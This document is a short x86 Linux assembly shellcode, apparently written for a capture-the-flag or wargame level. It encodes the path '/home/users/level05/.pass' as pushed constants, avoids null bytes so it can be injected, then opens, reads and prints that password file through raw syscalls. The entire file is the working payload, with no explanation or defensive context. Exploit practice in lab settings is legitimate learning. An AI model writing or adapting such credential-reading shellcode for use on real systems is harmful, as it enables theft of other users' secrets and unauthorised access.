global _start

section .data

_start:
  xor ecx, ecx
  mul ecx

open:
  mov al, 0x05

  mov ebx, 0xFFFFFF8D ; inversed to avoid null bytes
  neg ebx
  push ebx
  push 0x7361702E
  push 0x2F35306C
  push 0x6576656C
  push 0x2F737265
  push 0x73752F65
  push 0x6D6F682F
  mov ebx, esp
  int 0x80

read:
  xchg eax, ebx
  xchg eax, ecx
  mov al, 0x03
  mov dx, 0x0FFF
  inc edx
  int 0x80

write:
  xchg eax, edx
  mov bl, 0x01
  shr eax, 0x0A
  int 0x80

exit:
  xchg eax, ebx
  int 0x80